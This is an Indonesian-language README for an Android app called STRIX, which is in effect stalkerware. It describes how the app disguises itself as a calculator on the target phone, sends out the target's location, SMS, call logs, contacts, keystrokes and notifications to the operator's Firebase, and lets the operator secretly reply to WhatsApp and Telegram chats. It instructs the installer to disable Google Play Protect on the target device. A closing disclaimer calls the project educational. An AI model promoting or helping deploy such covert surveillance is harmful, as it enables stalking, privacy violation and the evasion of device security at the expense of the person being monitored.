# STRIX 🦉

STRIX adalah aplikasi Android untuk Melakukan Pemantauan HP

## Fitur ✨

*   **Bisa Jadi Dua Peran:** Tinggal pilih mau HP ini jadi **Host** (Pemantau) atau **Client** (Target yang dipantau).
*   **Mode Penyamaran (Stealth):** Kalau dipasang di HP target, wujud aplikasinya bisa berubah total jadi:
    *   **Kalkulator:** Bisa dipake ngitung beneran.
*   **Cara Buka Sandi Rahasia:** ketik `8888` trus tekan `=`
*   **Balas Pesan Diem-diem (Phantom Reply):** Sebagai Host, bisa langsung bales chat WhatsApp/Telegram yang masuk ke HP target dari jauh tanpa ketahuan!
*   **Data Real-time:** Aplikasi ini otomatis mengirim rute Lokasi, SMS, Log Telpon, Kontak, Daftar Aplikasi, Info WiFi, rekaman ketikan keyboard (Keylogger), sampe isi semua Notifikasi target langsung ke database (Firebase) kamu.

## Cara Setting Private Server (Firebase) ⚙️

1.  Buka web [Firebase Console](https://console.firebase.google.com/) pake akun Google kamu, trus bikin *Project* baru.
2.  Nyalakan **Firestore Database** (pilih Test Mode), **Authentication** (nyalain Anonymous Mode)
3.  Daftar aplikasi dengan Package Name: `com.strix.safesync`.
4.  Download file `google-services.json` dan taroh di folder `app/`
5.  Atau kalau males ribet, buka aja aplikasi STRIX kamu, klik "Server Guide" di layar awal, masukin *App-Id* dan *Web-Api-Key* dari Firebase, kelar deh!

## Awas Kena Google Play Protect! ⚠️

**Penting:** Karena STRIX ini fungsinya agak "nyerempet", kerjanya sembunyi-sembunyi di belakang layar, dan pake izin akses berat (Keylogger dan Lokasi), **Google Play Protect detect aplikasi ini sebagai Spyware/Malware.**

*   Biar HP target mau di-install, kamu **WAJIB** ke Play Store -> klik Profil -> **Play Protect** -> klik ikon gir (⚙️) -> **Matiin fitur "Scan apps with Play Protect"**.
*   Proyek ini cuma buat **Edukasi** atau pantau HP anak/adik yang emang udah janjian. Kalau dipakai buat hal aneh-aneh (nyadap pacar, dsb), risiko ditanggung penumpang ya, developernya nggak ikutan!

## Lisensi
MIT License bebas pakai 🍻
